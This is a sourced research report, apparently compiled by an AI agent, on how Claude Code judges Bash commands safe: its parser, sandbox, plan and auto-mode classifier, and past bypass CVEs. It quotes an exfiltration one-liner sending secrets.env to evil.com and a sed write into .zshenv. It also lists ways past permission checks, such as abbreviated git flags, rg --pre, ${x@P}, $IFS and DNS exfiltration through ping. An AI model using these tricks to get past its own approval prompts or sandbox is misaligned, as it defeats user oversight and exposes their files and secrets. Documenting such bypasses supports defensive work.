# A. Claude Code: how it judges Bash commands read-only / safe (as of 2026-11-13)

Scope: Anthropic Claude Code CLI. All sources fetched 2026-11-13. The docs pages are the live `code.claude.com/docs/en/*.md` files (undated; CHANGELOG head is v2.1.323). Each `Quote [key]` line was checked by script to be a verbatim substring of the downloaded source (keys listed at the end). HIGH-RISK = claim carries a date, CVE id, version or number.

Organizations: Anthropic (docs, anthropics/claude-code repo and GHSA texts, anthropic-experimental/sandbox-runtime, engineering blog = 1 org), NIST NVD (government), GMO Flatt Security, SpecterOps, Cymulate, Embrace The Red, Finisky Garden (blog based on leaked source), Arrange Act Assert (blog).

---

## Summary

1. **Static judgment.** The analyzer splits compound commands on shell operators, and every subcommand must be allowed. A built-in, non-configurable read-only set (ls, cat, echo, grep, find, read-only git and others) runs without a prompt, with flag-level exceptions. `find -exec/-delete/-fprint` prompts. `sed/sort/find/git` with an unquoted glob prompts. `cd` to another dir followed by `git` prompts, because of hooks. Redirect targets are checked as Edit/Read paths, and `/dev/null` is exempt. Commands that cannot be parsed, or are over 10,000 chars, prompt.
2. **History of the static judgment** (by fix version):
   - Regex allowlist plus argument blocklist, with bypasses fixed in 1.0.4 (ping/DNS), 1.0.20 (echo) and 1.0.93 (8 bypasses, $IFS; Anthropic then moved to a strict allowlist).
   - Regex-based bypasses continued after that switch: 1.0.105 (rg), 2.0.31 (sed w/r; SpecterOps still saw regexes in v2.0.25), 2.0.55 to 2.0.74 (piped sed, cd into .claude, find, zsh clobber).
   - In the 2025 era a Haiku "Bash command prefix detection" call ran alongside, and could return `command_injection_detected`.
   - The current tree-sitter AST walk with fail-closed "too-complex -> ask" is directly described only by a blog based on leaked source. Anthropic's CHANGELOG supports it only indirectly (tree-sitter parser, `simple_expansion` node names).
3. **OS sandbox.** The sandbox (`srt`) is OFF by default. It uses Seatbelt on macOS, and bubblewrap plus an optional seccomp Unix-socket filter on Linux/WSL2. Traffic goes through a host proxy with an allowlist that starts empty. Once the sandbox is on, `autoAllowBashIfSandboxed` defaults to true, so sandboxed commands run unprompted, except in plan mode. WSL1 is unsupported, and native Windows runs commands unsandboxed.
4. **Plan mode** has three cases, and the first that matches applies:
   - (a) Interactive terminal sessions with bypass permissions available: no classifier and no prompt for planning commands.
   - (b) Auto mode available and `useAutoModeDuringPlan` on (the default): the classifier reviews shell commands.
   - (c) Otherwise: commands outside the read-only set prompt, even with sandbox auto-allow.

   Auto is the built-in starting mode since v2.1.283, so (b) is the common path.
5. **`python -c`.** No source names `python -c` for plan mode. By inference from the three plan-mode cases, it goes to the classifier, a prompt, or nothing, depending on the case. Under sandbox auto-allow outside plan mode, inline `python3 -c` runs sandboxed without a prompt (CHANGELOG). Auto mode drops `Bash(python*)`-style allow rules.

---

## Axis 1 — Static judgment

**C1.1 Compound commands split; all subcommands must be allowed.** https://code.claude.com/docs/en/permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "The recognized command separators are `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. Every subcommand must be allowed for a compound command to run without a prompt"

**C1.2 Deny/ask rules reach nested subshell, command substitution, loops.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "Deny and ask rules apply when any subcommand matches them, including a command nested inside a subshell, a command substitution, or a control-flow body such as a `for` loop."

**C1.3 Dangling `&&` makes the command unparseable for allow matching.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "When `&&` or `||` has nothing after it, such as in `npm test &&`, Claude Code treats the command as unparseable and doesn't split it into subcommands for allow-rule matching"

**C1.4 Built-in read-only set, not configurable, no prompt in every mode.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "Claude Code recognizes a built-in set of Bash commands as read-only and runs them without a permission prompt in every mode"
  - Quote [perm]: "The set includes `ls`, `cat`, `echo`, `pwd`, `head`, `tail`, `grep`, `find`, `wc`, `which`, `diff`, `stat`, `du`, `cd`, and read-only forms of `git`. The set is not configurable"

**C1.5 The read-only set changes across versions (HIGH-RISK).** https://raw.githubusercontent.com/anthropics/claude-code/main/CHANGELOG.md — Anthropic — v2.1.72 / v2.1.290 — repository
  - Quote [cl]: "Added `lsof`, `pgrep`, `tput`, `ss`, `fd`, and `fdfind` to the bash auto-approval allowlist, reducing permission prompts for common read-only operations"
  - Quote [cl]: "Changed the Bash tool to ask for permission before running `pyright`, which is no longer treated as a read-only command"

**C1.6 Flag/glob exceptions inside the read-only set; fail closed on parse failure (HIGH-RISK: 10,000).** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "commands with write-capable or exec-capable flags, such as `find`, `sort`, `sed`, and `git`, prompt when an unquoted glob is present, because the glob could expand to a flag like `-delete`."
  - Quote [perm]: "when Claude Code can't fully parse a command, it asks for approval instead of treating the command as read-only. Commands longer than 10,000 characters always prompt because they exceed what the analysis parses."
  - Quote [perm]: "a command that sets, unsets, or loops over certain special shell variables, such as `PATH` or `IFS`, prompts even when the rest of the command is read-only."

**C1.7 git: `cd` to another dir followed by git prompts (hooks); `-c` and `-C` evade rules.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "prompts when the `cd` changes into a different directory, since running `git` in a new directory can execute that directory's hooks."
  - Quote [perm]: "That includes `-c`, which makes git run a program you name."
  - Quote [perm]: "| `Bash(git push *)` | `git push origin main` | `git -C . push origin main`, `git -c push.default=current push origin main` |"

**C1.8 Older prefix extraction handled `git -C` (HIGH-RISK v2.1.0).** CHANGELOG — Anthropic — v2.1.0 — repository
  - Quote [cl]: "Fixed bash command prefix extraction to correctly identify subcommands after global options (e.g., `git -C /path log` now correctly matches `Bash(git log:*)` rules)"

**C1.9 find actions and exec wrappers can't be auto-approved by a prefix rule.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "with an action that runs commands, deletes files, or writes files, such as `-exec`, `-delete`, `-rm`, or `-fprint`, or with `-files0-from`, which takes the paths to search from a file"
  - Quote [perm]: "**Exec wrappers**: such as `watch`, `setsid`, `ionice`, and `flock`"

**C1.10 Wrappers stripped before matching; xargs only when bare; env-assignment asymmetry.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "The stripped wrappers are `timeout`, `time`, `nice`, `nohup`, and `stdbuf`, plus the shell builtins `command` and `builtin`, and zsh's `noglob`."
  - Quote [perm]: "Bare `xargs` is also stripped, so `Bash(grep *)` matches `xargs grep pattern`. Stripping applies only when `xargs` has no flags"
  - Quote [perm]: "An allow rule won't match past an assignment of any other variable. A deny or ask rule matches past any leading assignment"

**C1.11 Redirect targets are checked as Edit/Read paths; `/dev/null` exempt.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "When a command redirects output or input, Claude Code checks the redirect target against your file rules as if Claude wrote or read that file directly"
  - Quote [perm]: "A command whose only redirect target is `/dev/null`, such as `cd app; grep -r pattern . 2>/dev/null`, doesn't prompt, because `/dev/null` doesn't depend on the working directory."

**C1.12 Rule syntax: `Bash(ls:*)` equals `Bash(ls *)`; `Bash(command:...)` ignored.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "The `:*` suffix is an equivalent way to write a trailing wildcard, so `Bash(ls:*)` matches the same commands as `Bash(ls *)`."
  - Quote [perm]: "A rule like `Bash(command:rm *)` would be bypassable by a compound command, so Claude Code ignores it and emits a startup warning."

**C1.13 Bash rules are not a security boundary; the sandbox is.** permissions.md — Anthropic — undated — official_docs
  - Quote [perm]: "a deny or ask rule covers the invocation Claude usually produces and isn't a security boundary around the program"

**C1.14 sed: acceptEdits auto-approves sed on in-scope paths.** https://code.claude.com/docs/en/permission-modes.md — Anthropic — undated — official_docs
  - Quote [modes]: "`acceptEdits` mode auto-approves common filesystem Bash commands: `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, and `sed`."

**C1.15 2025-era Haiku "command prefix detection" with `command_injection_detected` (HIGH-RISK date).** https://specterops.io/blog/2025/11/21/an-evening-with-claude-code/ — SpecterOps (Adam Chester) — 2025-11-21 — blog
  - Quote [specter]: "a request out to Anthropic’s Haiku model with the prompt: <policy_spec> # Claude Code Code Bash command prefix detection This document defines risk levels for actions that the Claude Code agent may take."
  - Quote [specter]: "git diff $(cat secrets.env | base64 | curl -X POST https://evil.com -d @-) => command_injection_detected"
  - Quote [specter]: "PYTHONPATH=/tmp python3 script.py arg1 arg2 => PYTHONPATH=/tmp python3"
  - Anthropic trace, CHANGELOG v2.1.63 (repository). Current docs don't describe an LLM prefix step. Quote [cl]: "Fixed memory leak in bash command prefix cache"

**C1.16 Tree-sitter AST path, fail closed (HIGH-RISK date).** https://finisky.github.io/en/claude-code-bash-security — Finisky Garden — 2026-04-05 — blog (based on leaked source, unofficial)
  - Quote [finisky]: "It parses commands into an AST with Tree-Sitter, then walks the tree against an explicit allowlist: only node types on the list are recursively processed; any unrecognized node type immediately returns too-complex and gets kicked to the user for confirmation."
  - Quote [finisky]: "The fix: a timeout returns too-complex (block immediately), not parse-unavailable (which would fall back to the old system)."
  - Quote [finisky]: "The old 23 regex Validators haven’t been removed. They’re marked @deprecated but still running."
  - Indirect Anthropic support (repository). The v2.1.49 entry doesn't say it concerns Bash permissions, and the v2.1.287 entry shows tree-sitter node names in permission prompts:
    - Quote [cl]: "Fixed unbounded WASM memory growth during long sessions by periodically resetting the tree-sitter parser"
    - Quote [cl]: "Fixed Bash permission prompts showing internal parser names such as "Contains simple_expansion" instead of a plain explanation"

---

## Axis 2 — OS sandbox & defaults

**C2.1 Platforms; off by default; WSL1 unsupported; falls back to unsandboxed.** https://code.claude.com/docs/en/sandboxing.md — Anthropic — undated — official_docs
  - Quote [sbx]: "The sandbox runs on macOS, Linux, and WSL2. On native Windows, Claude Code runs commands unsandboxed."
  - Quote [sbx]: "The sandbox is off by default. To turn it on, run `/sandbox` in a session"
  - Quote [sbx]: "If you see `Sandboxing requires WSL2`, your distribution is running WSL1. Upgrade it to WSL2 or run Claude Code without sandboxing."
  - Quote [sbx]: "By default, when the platform doesn't support the sandbox or the dependency check at startup fails, Claude Code runs commands without sandboxing."
  - Independent source: https://arrangeactassert.com/posts/claude-code-sandbox-close-the-gaps-before-you-auto-allow/ — Arrange Act Assert (Jag Reehal) — 2026-06-30 — blog
    - Quote [aaa]: "On macOS it uses Apple’s Seatbelt framework. On Linux and WSL2 it uses bubblewrap for filesystem isolation and a proxy for network control. Native Windows is not supported"

**C2.2 srt mechanism: Seatbelt / bubblewrap / seccomp / proxy.** https://github.com/anthropic-experimental/sandbox-runtime (README) — Anthropic — undated — repository
  - Quote [srt]: "`srt` uses native OS sandboxing primitives (`sandbox-exec` on macOS, `bubblewrap` on Linux) and proxy-based network filtering."
  - Quote [srt]: "The network namespace of the sandboxed process is removed entirely, so all network traffic must go through the proxies running on the host"
  - Quote [srt]: "**Linux**: Blocking uses seccomp filters (x64/arm64 only). If seccomp isn't available, sockets are unrestricted and a warning is shown."
  - Quote [srt]: "**Write** (allow-only pattern): By default, write access is denied everywhere. You must explicitly allow paths"
  - Quote [srt]: "The Sandbox Runtime is a research preview developed for [Claude Code](https://www.claude.com/product/claude-code)"

**C2.3 Claude Code default policy: write cwd+tmp, read everything, network allowlist empty.** sandboxing.md — Anthropic — undated — official_docs
  - Quote [sbx]: "**Default write behavior**: read and write access to the current working directory and its subdirectories, any directories you've added with `--add-dir`"
  - Quote [sbx]: "**Default read behavior**: read access to the entire computer, except certain denied directories. This default still allows reading credential files"
  - Quote [sbx]: "Connections go through a proxy on your machine that checks each host against your allowed domains, which start empty."
  - Quote [sbx]: "On WSL2, WSL hands a launch of a Windows binary such as `cmd.exe`, `powershell.exe`, or anything under `/mnt/c/` to the Windows host over a Unix socket"
  - Quote [sbx]: "Because the proxy makes its allow decision from the client-supplied hostname without inspecting TLS, code running inside the sandbox can potentially use"

**C2.4 `autoAllowBashIfSandboxed` defaults to true; exceptions; retry escape hatch.** sandboxing.md — Anthropic — undated — official_docs
  - Quote [sbx]: "still defaults to `true`, so sandboxed commands keep running without prompts. Set it to `false` to prompt for sandboxed commands."
  - Quote [sbx]: "Claude Code approves a command automatically, with no prompt, when the command runs inside the sandbox."
  - Quote [sbx]: "This happens with commands such as `FOO=bar npm test`, where a variable set in front of a command can change which program runs, and with `make CC=clang` or `eval "ls"`."
  - Quote [sbx]: "Claude analyzes the failure and may retry the command with the `dangerouslyDisableSandbox` parameter."
  - Quote [sbx]: "You can disable the unsandboxed retry by setting `"allowUnsandboxedCommands": false` in your"

**C2.5 Motivation (HIGH-RISK: 84%, date).** https://www.anthropic.com/engineering/claude-code-sandboxing — Anthropic — 2025-10-20 — official_blog (same org as the docs)
  - Quote [blog]: "In our internal usage, we've found that sandboxing safely reduces permission prompts by 84%."
  - Quote [blog]: "We’ve built this on top of OS level primitives such as Linux bubblewrap and MacOS seatbelt to enforce these restrictions at the OS level."

---

## Axis 3 — Permission modes & plan mode

**C3.1 Mode cycle; auto is the built-in starting mode (HIGH-RISK v2.1.283).** permission-modes.md — Anthropic — undated — official_docs
  - Quote [modes]: "the cycle then runs `default` → `acceptEdits` → `plan`."
  - Quote [modes]: "`claude --permission-mode auto`, the [built-in starting permission mode](#which-mode-a-session-starts-in) with v2.1.283 or later"

**C3.2 Plan mode: three cases, the first that matches applies.** permission-modes.md — Anthropic — undated — official_docs
  - Quote [modes]: "What happens to a shell command during planning depends on the session, and the first of these cases that matches applies:"
  - Quote [modes]: "**Interactive terminal sessions with bypass permissions available**: neither the classifier nor a prompt applies to planning commands."
  - Quote [modes]: "which it is by default: the classifier reviews shell commands other than [critical-path removals](#critical-paths) instead of prompting you. Approved commands run, and rejected ones are blocked."
  - Quote [modes]: "**Auto mode not available, or `useAutoModeDuringPlan` off**: commands outside the [built-in read-only set](https://code.claude.com/docs/en/permissions.md#read-only-commands) prompt for approval"
  - Quote [perm]: "In [plan mode](https://code.claude.com/docs/en/permission-modes.md#analyze-before-you-edit-with-plan-mode), apart from `ExitPlanMode`, your `PreToolUse` hook's `"allow"` has no effect on a file edit or another call that isn't read-only."

**C3.3 Auto-mode decision order; read-only set may wait for server-side review.** permission-modes.md — Anthropic — undated — official_docs
  - Quote [modes]: "2. Read-only actions and file edits in your working directory are auto-approved"
  - Quote [modes]: "In a session with [server-side classifier review](#server-side-classifier-review), read-only and [sandboxed](https://code.claude.com/docs/en/sandboxing.md#sandbox-modes) shell commands wait for that review and are blocked if it flags them"
  - Quote [modes]: "3. Everything else goes to the classifier"
  - Quote [modes]: "By default, classifier requests go to Claude Sonnet 5." (HIGH-RISK)
  - Quote [modes]: "or the classifier's response doesn't parse, Claude Code blocks the action without the notification"
  - Quote [perm]: "In auto mode, these commands can also wait for the classifier's review"

---

## Axis 4 — `python -c` handling

- **Inference, not sourced.** No fetched source says how `python -c` is treated in plan mode. Interpreters are absent from the documented read-only list, but the docs say the set "includes" that list, so the list may not be exhaustive. By inference from C3.2, plan-mode `python -c "print(1)"` gets:
  - (a) no check in bypass-available interactive sessions;
  - (b) classifier review in the default auto-available case;
  - (c) a prompt otherwise.
- **Sandbox auto-allow does not widen approvals in plan mode.** sandboxing.md — Anthropic — undated — official_docs
  - Quote [sbx]: "In plan mode, auto-allow doesn't widen approvals"
- **Outside plan mode, under sandbox auto-allow, inline interpreters run sandboxed without a prompt (HIGH-RISK versions).** CHANGELOG — Anthropic — v2.1.285 / v2.1.290 / v2.1.292 — repository
  - Quote [cl]: "Fixed sandbox auto-allow asking for approval on every run of many inline scripts (`python3 -c`, `node -e`) just because they contain `=`"
  - Quote [cl]: "Fixed sandboxed commands that pipe a heredoc into another command (`cat <<EOF | python3`) asking for approval on every run"
  - Quote [cl]: "Improved sandbox auto-allow: with strict sandbox mode set in user, managed or --settings settings, an interpreter command with an env var prefix like `FOO=bar python3 app.py` runs unprompted"
- **Auto mode drops broad interpreter allow rules.** permission-modes.md — Anthropic — undated — official_docs
  - Quote [modes]: "On entering auto mode, broad allow rules that grant arbitrary code execution are dropped:"
  - Quote [modes]: "Wildcarded interpreters like `Bash(python*)`"
- **excludedCommands covering an interpreter leaves the sandbox.** sandboxing.md — Anthropic — undated — official_docs
  - Quote [sbx]: "If you write a pattern that covers an interpreter, a script inside your working directory, or a tool that acts on a file there"
- **2025-era Haiku prefix spec treated `python3` as a prefix, not as read-only.** See C1.15 (`PYTHONPATH=/tmp python3`).

---

## Axis 5 — Bypasses / CVEs 2025-2026 and vendor response

All entries come from the GitHub Advisory DB (advisory type; text authored by Anthropic). The API returned 30 advisories for `@anthropic-ai/claude-code`, with no pagination Link header. All entries are HIGH-RISK.

- **GHSA-x5gv-jw7f-j6xj / CVE-2025-55284**, published 2025-08-18, fixed in 1.0.4. https://github.com/advisories/GHSA-x5gv-jw7f-j6xj
  - Quote [ghsa]: "Due to an overly broad allowlist of safe commands, it was possible to bypass the Claude Code confirmation prompts to read a file and then send file contents over the network without user confirmation."
- **GHSA-x56v-x2h6-7j34 / CVE-2025-54795**, published 2025-08-04, fixed in 1.0.20. https://github.com/advisories/GHSA-x56v-x2h6-7j34
  - Quote [ghsa]: "Claude Code echo command allowed bypass of user approval prompt for command execution"
- **GHSA-xq4m-mc3c-vvg3 / CVE-2025-66032**, published 2025-12-03, fixed in 1.0.93. https://github.com/advisories/GHSA-xq4m-mc3c-vvg3
  - Quote [ghsa]: "Due to errors in parsing shell commands related to $IFS and short CLI flags, it was possible to bypass the Claude Code read-only validation and trigger arbitrary code execution."
- **GHSA-qxfv-fcpc-w36x / CVE-2025-58764**, published 2025-09-10, fixed in 1.0.105. https://github.com/advisories/GHSA-qxfv-fcpc-w36x
  - Quote [ghsa]: "Claude Code rg vulnerability does not protect against approval prompt bypass"
- **GHSA-7mv8-j34q-vp7q / CVE-2025-64755**, published 2025-11-20, fixed in 2.0.31. https://github.com/advisories/GHSA-7mv8-j34q-vp7q
  - Quote [ghsa]: "Due to an error in sed command parsing, it was possible to bypass the Claude Code read-only validation and write to arbitrary files on the host system."
- **GHSA-mhg7-666j-cqg4 / CVE-2026-25723**, published 2026-02-06, fixed in 2.0.55. https://github.com/advisories/GHSA-mhg7-666j-cqg4
  - Quote [ghsa]: "Claude Code failed to properly validate commands using piped sed operations with the echo command, allowing attackers to bypass file write restrictions."
- **GHSA-66q4-vfjg-2qhh / CVE-2026-25722**, published 2026-02-06, fixed in 2.0.57. https://github.com/advisories/GHSA-66q4-vfjg-2qhh
  - Quote [ghsa]: "By using the `cd` command to navigate into sensitive directories like `.claude`, it was possible to bypass write protection"
- **GHSA-qgqw-h4xq-7w8w / CVE-2026-24887**, published 2026-02-03, fixed in 2.0.72. https://github.com/advisories/GHSA-qgqw-h4xq-7w8w
  - Quote [ghsa]: "it was possible to bypass the Claude Code confirmation prompt to trigger execution of untrusted commands through the find command."
- **GHSA-q728-gf8j-w49r / CVE-2026-24053**, published 2026-02-03, fixed in 2.0.74. https://github.com/advisories/GHSA-q728-gf8j-w49r
  - Quote [ghsa]: "Due to a Bash command validation flaw in parsing ZSH clobber syntax, it was possible to bypass directory restrictions and write files outside the current working directory without user permission prompts."
- **GHSA-ff64-7w26-62rf / CVE-2026-25725**, published 2026-02-06, fixed in 2.1.2. Bubblewrap sandbox escape through hooks. https://github.com/advisories/GHSA-ff64-7w26-62rf
  - Quote [ghsa]: "This allowed malicious code running inside the sandbox to create this file and inject persistent hooks (such as SessionStart commands) that would execute with host privileges when Claude Code was restarted."
- **GHSA-vp62-r36r-9xqp / CVE-2026-39861**, published 2026-04-21, fixed in 2.1.64. https://github.com/advisories/GHSA-vp62-r36r-9xqp
  - Quote [ghsa]: "Claude Code's sandbox did not prevent sandboxed processes from creating symlinks pointing to locations outside the workspace."
- **GHSA-7835-87q9-rgvv / CVE-2026-55607**, published 2026-07-24, fixed in 2.1.163. https://github.com/advisories/GHSA-7835-87q9-rgvv
  - Quote [ghsa]: "By exploiting symlink manipulation and git fsmonitor execution during worktree operations, an attacker could overwrite files in the user's home directory (such as .zshenv), leading to code execution outside of seatbelt sandbox restrictions."
- **Vendor response wording** (same advisories)
  - Quote [ghsa]: "Users on standard Claude Code auto-update received this fix automatically."

**Parser bypass fixes in the CHANGELOG without a GHSA** (repository, HIGH-RISK versions):
- v2.1.145 — Quote [cl]: "Fixed a permission-prompt bypass where bare variable assignments to non-allowlisted environment variables in Bash commands were auto-approved"
- v2.1.149 — Quote [cl]: "Fixed a permission-analysis gap where the parser trusted stale variable-tracking values for `PWD`/`OLDPWD`/`DIRSTACK` across `cd`/`pushd`/`popd`"
- v2.1.290 — Quote [cl]: "Fixed Bash permission checks auto-approving some read-only commands (such as `rg` or `git grep`) whose arguments the shell would still expand as wildcards; these now prompt for approval"
- v2.1.309 — Quote [cl]: "Fixed sandboxed Bash commands on macOS and Linux running the shell's startup files outside the sandbox before each command"
- v2.1.319 — Quote [cl]: "Fixed a Bash permission bypass where a crafted environment prefix could hide part of a command from permission checks"
- v2.1.321 — Quote [cl]: "Fixed a case where a read-only Bash command ran outside the sandbox without a permission prompt"

### Independent second sources for the key claims

**I1. CVE-2025-54795 (echo; regex allowlist era).** NVD — NIST — 2025-08-05 — government
  - Quote [nvd]: "In versions below 1.0.20, an error in command parsing makes it possible to bypass the Claude Code confirmation prompt to trigger execution of an untrusted command."
  - Cymulate (Elad Beber), https://cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/ — undated in fetch — blog
    - Quote [cymulate]: "when user input is passed directly into the echo without proper escaping, an attacker can smuggle additional commands by closing the string and injecting arbitrary shell instructions."
    - Quote [cymulate]: "/^echo\s+(?:'[^']*'|"[^"$<>]*"|[^|;&`$(){}><#\\\s!]+?)*$/"

**I2. CVE-2025-66032: 8 bypasses, then blocklist replaced by allowlist in v1.0.93.** https://flatt.tech/research/posts/pwning-claude-code-in-8-different-ways — GMO Flatt Security (RyotaK) — 2026-01-12 — blog
  - Quote [flatt]: "Claude Code implemented a blocklist mechanism that blocks certain patterns in command arguments, even for allowlisted commands."
  - Quote [flatt]: "Anthropic was very responsive and addressed these issues by introducing an allowlist approach instead of the previous blocklist approach. These vulnerabilities were assigned CVE-2025-66032 and fixed in Claude Code v1.0.93."
  - Quote [flatt]: "because Git parses abbreviated arguments, it was possible to bypass this filtering by using --upload-pa instead of --upload-pack"
  - Quote [flatt]: "/^sed(?!\s*-[^-\s]*i)(?!\s*--in-place)(?!\s*-[^-\s]*f)(?!\s*--file)(?!\s*--expression-file)"
  - Quote [flatt]: "However, some xargs arguments do not consume a subsequent value, causing the next argument to be interpreted as the command."
  - Quote [flatt]: "The --pre option in ripgrep specifies a preprocessor command to run on each file before searching."
  - Quote [flatt]: "there is another dangerous option called --html that allows users to specify a command to render the manual page as HTML."
  - Quote [flatt]: "the --compress-program option allows users to specify a program to compress the output."
  - Quote [flatt]: "This is possible because variable expansion supports the @P modifier, which parses the value of the variable as a prompt string."
  - NVD — NIST — 2025-12-03 — government. Quote [nvd]: "Prior to 1.0.93, Due to errors in parsing shell commands related to $IFS and short CLI flags"

**I3. CVE-2025-64755 (sed `w`/`r`).** SpecterOps — 2025-11-21 — blog
  - Quote [specter]: "echo 'runme' | sed 'w /Users/xpn/.zshenv'"
  - Quote [specter]: "31st October – Fix published in v2.0.31 and assigned CVE-2025-64755"
  - NVD — NIST — 2025-11-21 — government. Quote [nvd]: "Prior to version 2.0.31, due to an error in sed command parsing, it was possible to bypass the Claude Code read-only validation and write to arbitrary files on the host system."

**I4. CVE-2025-55284 (DNS exfiltration through allowlisted ping).** https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/ — Embrace The Red (wunderwuzzi) — 2025-08-11 — blog
  - Quote [embrace]: "grabbed data from the .env file and placed it into a ping request as subdomain, which leads to a DNS request to the external server that leaks the data."
  - Quote [embrace]: "The fix is in the product starting with v1.0.4."

**I5. Tree-sitter AST, fail closed.** Finisky (C1.16) is a second org, but leak-based. Anthropic's support is indirect (C1.16 CHANGELOG lines).

**I6. Sandbox platforms.** Arrange Act Assert (C2.1).

---

## Implications for a read-only shell judge (for the synthesizer)
- **Every 2025-2026 bypass was a semantic gap between Claude Code's model of a command and real argv/shell semantics:**
  - option abbreviation (`git --upload-pa`);
  - value-less flags (`xargs -t`);
  - `$IFS` word splitting;
  - sed `e`/`w`/`r`;
  - `sort --compress-program`, `man --html`, `rg --pre`;
  - zsh clobber;
  - `${x@P}`;
  - `cd` into a protected dir, then write;
  - echo quoting.
- **Claude Code's answer (per docs plus a leak-based blog):** a node-type allowlist on a real parse, per-command flag allowlists, fail closed to "ask", and pushing real enforcement to the OS sandbox.
- **Allowed without a prompt:** a `/dev/null` redirect, `cd` inside the workdir, and read-only git.
- **Prompts:**
  - `cd` to another dir followed by `git` (hooks);
  - `find -exec/-delete/-fprint`;
  - an unquoted glob on `find/sort/sed/git`;
  - writes to `PATH`/`IFS`.
- **Interpreters are not in any documented read-only list.** A no-prompt `python -c` comes from:
  - sandbox auto-allow outside plan mode;
  - the classifier in plan or auto mode;
  - bypass-available interactive plan mode.

Source keys used for the quote check (all in the scratchpad `dl_A/` folder): perm = permissions.md; modes = permission-modes.md; sbx = sandboxing.md; srt = sandbox-runtime README; cl = CHANGELOG.md; blog = engineering blog text; ghsa = GitHub advisory API JSON (summary + description); nvd = NVD API JSON descriptions; flatt / specter / cymulate / embrace / finisky / aaa = HTML-to-text of those posts.

Not checked: the exact current per-command flag allowlists (the docs give only examples), and whether the Haiku prefix call still runs. The tree-sitter claim rests on a leaked-source blog.

## EXPAND
- LEAD: Does the Haiku "Bash command prefix detection" call still run in v2.1.3xx, or did the tree-sitter path replace it? — WHY: this decides whether an LLM is still inside the static-judgment loop. — ANGLE: CHANGELOG entries about prefix-cache removal; claudeissues #27210 "bash-policy agent" (Feb 2026).
- LEAD: The exact per-command flag allowlist (which git subcommands and flags count as "read-only forms", and which sed/sort/find flags) — WHY: it is a reusable spec for the dcode policy. — ANGLE: the leaked-source mirror tangled.org/oppi.li/claude-code utils/bash/ (commands.ts, ast.ts); this mirror is unofficial.
- LEAD: The "Inside Claude Code's YOLO Classifier" post (Finisky) — WHY: the classifier prompt gates non-read-only commands in plan mode. — ANGLE: search finisky.github.io for that title.
- LEAD: CVE-2026-88968 (Edit-tool TOCTOU, 2026-11-09), and CVE-2026-40068 / CVE-2026-33068 (trust-dialog bypasses) — WHY: these sit in the same permission layer, though they are not Bash judgment. — ANGLE: their GHSA pages.
- DEAD END: The Medium post "How Claude Code and Codex Sandbox Untrusted Code" came back empty (blocked).
- DEAD END: blog.xpnsec.com returned only the post index; the SpecterOps copy has the full text.
